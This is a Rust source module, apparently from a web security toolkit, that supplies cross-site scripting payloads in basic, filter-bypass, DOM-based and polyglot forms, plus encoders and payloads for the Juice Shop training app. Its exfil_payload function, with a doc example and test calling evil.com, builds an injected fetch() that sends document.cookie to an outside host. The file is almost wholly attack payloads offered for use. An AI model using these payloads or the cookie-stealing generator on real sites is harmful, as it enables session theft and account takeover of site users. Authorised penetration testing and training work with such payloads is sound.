//! XSS (Cross-Site Scripting) payload generation
//!
//! Provides various XSS payloads including filter bypass techniques.

/// XSS payload with description
#[derive(Debug, Clone)]
pub struct XssPayload {
    pub name: String,
    pub payload: String,
    pub category: XssCategory,
    pub context: XssContext,
}

#[derive(Debug, Clone, PartialEq)]
pub enum XssCategory {
    Basic,
    FilterBypass,
    Polyglot,
    DomBased,
    Encoded,
}

#[derive(Debug, Clone, PartialEq)]
pub enum XssContext {
    Html,
    Attribute,
    JavaScript,
    Url,
    Css,
}

impl XssPayload {
    pub fn new(
        name: impl Into<String>,
        payload: impl Into<String>,
        category: XssCategory,
        context: XssContext,
    ) -> Self {
        Self {
            name: name.into(),
            payload: payload.into(),
            category,
            context,
        }
    }
}

/// Basic XSS payloads
pub fn basic_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "Script tag",
            "<script>alert('XSS')</script>",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "Img onerror",
            "<img src=x onerror=alert('XSS')>",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "Iframe",
            "<iframe src=\"javascript:alert('XSS')\">",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "SVG onload",
            "<svg onload=alert('XSS')>",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "Body onload",
            "<body onload=alert('XSS')>",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "Input onfocus",
            "<input onfocus=alert('XSS') autofocus>",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "A href javascript",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            XssCategory::Basic,
            XssContext::Html,
        ),
    ]
}

/// Filter bypass payloads
pub fn filter_bypass_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "Double encoding",
            "<<script>script>alert('XSS')<</script>/script>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "Case mixing",
            "<ScRiPt>alert('XSS')</sCrIpT>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "Null byte",
            "<scr%00ipt>alert('XSS')</script>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "HTML entities",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "Unicode escape",
            "<script>\\u0061lert('XSS')</script>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "Tab/newline",
            "<img src=x\tonerror\n=\nalert('XSS')>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "Backtick",
            "<img src=x onerror=`alert('XSS')`>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "Without quotes",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "SVG/animate",
            "<svg><animate onbegin=alert('XSS') attributeName=x>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "Object data",
            "<object data=\"javascript:alert('XSS')\">",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
    ]
}

/// DOM-based XSS payloads
pub fn dom_based_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "location.hash",
            "#<img src=x onerror=alert('XSS')>",
            XssCategory::DomBased,
            XssContext::Url,
        ),
        XssPayload::new(
            "document.write",
            "';alert('XSS');//",
            XssCategory::DomBased,
            XssContext::JavaScript,
        ),
        XssPayload::new(
            "innerHTML",
            "<img src=x onerror=alert('XSS')>",
            XssCategory::DomBased,
            XssContext::Html,
        ),
        XssPayload::new(
            "eval injection",
            "alert('XSS')",
            XssCategory::DomBased,
            XssContext::JavaScript,
        ),
    ]
}

/// Polyglot payloads (work in multiple contexts)
pub fn polyglot_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "Polyglot 1",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            XssCategory::Polyglot,
            XssContext::Html,
        ),
        XssPayload::new(
            "Polyglot 2",
            "'-alert(1)-'",
            XssCategory::Polyglot,
            XssContext::JavaScript,
        ),
        XssPayload::new(
            "Polyglot 3",
            "\"-alert(1)-\"",
            XssCategory::Polyglot,
            XssContext::Attribute,
        ),
    ]
}

/// URL encode XSS payload
pub fn url_encode_xss(payload: &str) -> String {
    payload
        .chars()
        .map(|c| match c {
            '<' => "%3C".to_string(),
            '>' => "%3E".to_string(),
            '"' => "%22".to_string(),
            '\'' => "%27".to_string(),
            '/' => "%2F".to_string(),
            ' ' => "%20".to_string(),
            _ => c.to_string(),
        })
        .collect()
}

/// HTML entity encode payload
pub fn html_entity_encode(payload: &str) -> String {
    payload
        .chars()
        .map(|c| format!("&#{};", c as u32))
        .collect()
}

/// Generate XSS callback payload for data exfiltration
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::xss::exfil_payload;
///
/// let payload = exfil_payload("http://evil.com/steal", "document.cookie");
/// assert!(payload.contains("evil.com"));
/// ```
pub fn exfil_payload(callback_url: &str, data_source: &str) -> String {
    format!(
        "<img src=x onerror=\"fetch('{}?data='+encodeURIComponent({}))\">",
        callback_url, data_source
    )
}

/// Juice Shop specific XSS payloads
pub fn juice_shop_xss() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "DOM XSS (search)",
            "<iframe src=\"javascript:alert('xss')\">",
            XssCategory::DomBased,
            XssContext::Html,
        ),
        XssPayload::new(
            "Bonus Payload (SoundCloud)",
            "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "Sanitization bypass",
            "<<script>script>alert('XSS')<</script>/script>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
        XssPayload::new(
            "API-only XSS",
            "<img src=x onerror=alert('XSS')>",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "HTTP Header XSS",
            "<script>alert('XSS')</script>",
            XssCategory::Basic,
            XssContext::Html,
        ),
        XssPayload::new(
            "Video XSS (VTT subtitle)",
            "</script><script>alert('xss')</script>",
            XssCategory::FilterBypass,
            XssContext::Html,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_basic_payloads() {
        let payloads = basic_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload.contains("<script>")));
    }

    #[test]
    fn test_filter_bypass() {
        let payloads = filter_bypass_payloads();
        assert!(payloads.iter().any(|p| p.name.contains("Double encoding")));
    }

    #[test]
    fn test_url_encode_xss() {
        let payload = url_encode_xss("<script>alert('XSS')</script>");
        assert!(payload.contains("%3C"));
        assert!(payload.contains("%3E"));
        assert!(!payload.contains('<'));
    }

    #[test]
    fn test_html_entity_encode() {
        let encoded = html_entity_encode("a");
        assert_eq!(encoded, "&#97;");
    }

    #[test]
    fn test_exfil_payload() {
        let payload = exfil_payload("http://evil.com", "document.cookie");
        assert!(payload.contains("fetch"));
        assert!(payload.contains("evil.com"));
    }

    #[test]
    fn test_juice_shop_xss() {
        let payloads = juice_shop_xss();
        assert!(payloads.iter().any(|p| p.name.contains("DOM XSS")));
        assert!(payloads
            .iter()
            .any(|p| p.name.contains("Sanitization bypass")));
    }
}
